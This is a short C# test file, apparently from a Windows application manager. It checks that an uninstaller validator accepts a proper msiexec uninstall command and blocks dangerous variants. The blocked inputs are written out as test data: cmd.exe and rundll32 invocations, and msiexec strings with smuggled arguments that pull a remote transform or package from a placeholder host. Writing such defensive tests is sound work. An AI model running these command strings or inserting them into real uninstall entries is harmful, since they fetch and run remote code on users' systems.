using GerenciadorAplicativos;
internal static class Work6UninstallTests
{
    internal const string Product="{00000000-0000-0000-0000-000000000123}";
    internal static void Policy(Action<bool,string> check)
    {
        check(MaintenanceAudit.CheckUninstaller("msiexec.exe /X"+Product,false)=="available",
            "WORK6 uninstall controle positivo: GUID MSI completo");
        foreach(string command in new[]{
            "cmd.exe /c echo fixture", "rundll32.exe fixture.dll,Entry",
            "msiexec.exe /X{ABC123}", "msiexec.exe /X"+Product+" TRANSFORMS=https://example.invalid/payload.mst",
            "msiexec.exe /X"+Product+" /i https://example.invalid/package.msi" })
            check(MaintenanceAudit.CheckUninstaller(command,false)!="available",
                "WORK6 uninstall bloqueia semântica perigosa: "+command.Split(' ')[0]+" "+command.Split(' ')[1]);
    }
}
